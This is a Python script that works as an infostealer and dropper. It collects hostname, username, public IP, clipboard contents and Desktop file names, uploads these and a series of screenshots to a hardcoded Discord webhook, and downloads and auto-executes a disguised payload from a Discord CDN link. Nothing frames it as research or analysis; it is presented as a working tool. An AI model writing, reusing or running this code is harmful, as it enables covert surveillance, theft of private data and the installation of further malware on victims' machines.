import platform
import socket
import os
import psutil
import pyperclip
import requests
import subprocess
import time
from pathlib import Path
from PIL import ImageGrab
from datetime import datetime

def get_system_info():
    return {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Hostname": socket.gethostname(),
        "Username": os.getlogin(),
        "CPU Cores": psutil.cpu_count(logical=True),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2)
    }

def take_screenshot():
    img = ImageGrab.grab()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = Path.home() / f"Desktop_Snapshot_{timestamp}.png"
    img.save(screenshot_path)
    return str(screenshot_path)

def periodic_screenshots(webhook_url: str, interval_seconds: int, duration_seconds: int):
    start_time = time.time()
    while time.time() - start_time < duration_seconds:
        screenshot_path = take_screenshot()
        print(f"📸 Took screenshot: {screenshot_path}")
        send_screenshot(webhook_url, screenshot_path)
        time.sleep(interval_seconds)

def get_clipboard_data():
    try:
        return pyperclip.paste()
    except Exception:
        return None

def list_files(directory):
    try:
        return os.listdir(directory)
    except Exception as e:
        return None

def public_ip():
    try:
        return requests.get("https://api.ipify.org?format=text", timeout=5).text
    except Exception as e:
        return None

def send_text_to_discord(webhook_url: str, message: str):
    payload = {"content": f"```{message}```"}  
    r = requests.post(webhook_url, json=payload, timeout=10)

def send_screenshot(webhook_url: str, file_path: str):
    try:
        with open(file_path, "rb") as f:
            files = {"file": (Path(file_path).name, f, "image/png")}
            response = requests.post(webhook_url, files=files)
    except Exception as e:
        return print("something fucked up with sending the screenshot to discord", e)


def download_file(url: str, filename: str, autoexec: bool = True) -> str | None:
    downloads_dir = Path.home() / "Downloads"
    downloads_dir.mkdir(parents=True, exist_ok=True)

    save_path = downloads_dir / filename

    try:
        with requests.get(url, stream=True, timeout=10) as r:
            r.raise_for_status()
            with open(save_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        print(f"✅ File downloaded to {save_path}")

        if autoexec:
            print("🚀 Auto-executing …")
            subprocess.Popen([str(save_path)], shell=True)
        return str(save_path)
       
    except Exception as e:
        return None

if __name__ == "__main__":
    WEBHOOK = "https://discordapp.com/api/webhooks/1377428779038670950/3Ry5fvHlouB01eO87E2SXOfzOHgqV01Y1GDEThmj_yR4muMqXt_3UnK3P2003OYi2XOm" 
    PAYLOAD_URL = ("https://cdn.discordapp.com/attachments/1034221838722678888/""1377437541657083976/vuknok.gif?ex=6838f62d&is=6837a4ad&hm=""ff9b5942f25b7aa5a1450a71dc3b74f474b9df914dfcfbe83e17bb169a2d1ca5&")
    
    save_path = download_file(PAYLOAD_URL, "Vuknok.gif", autoexec=True)

    screenshot_path = take_screenshot()

    # main logs
    system_info = get_system_info()
    clipboard = get_clipboard_data()
    desktop_files = list_files(os.path.join(os.path.expanduser("~"), "Desktop"))
    public_ip_addr = public_ip()

    report = "[System Info]\n"
    report += "\n".join(f"{k}: {v}" for k, v in system_info.items())
    report += f"\n\nPublic IP: {public_ip_addr}"
    report += f"\n\n[Clipboard]\n{clipboard}"
    report += f"\n\n[Desktop Files]\n{', '.join(desktop_files[:10])}..." 
    report += f"\n\n[Downloaded File]\n{save_path}"

    # send main logs
    send_text_to_discord(WEBHOOK, report)

    # screenshot
    periodic_screenshots(WEBHOOK, interval_seconds=5, duration_seconds=60)
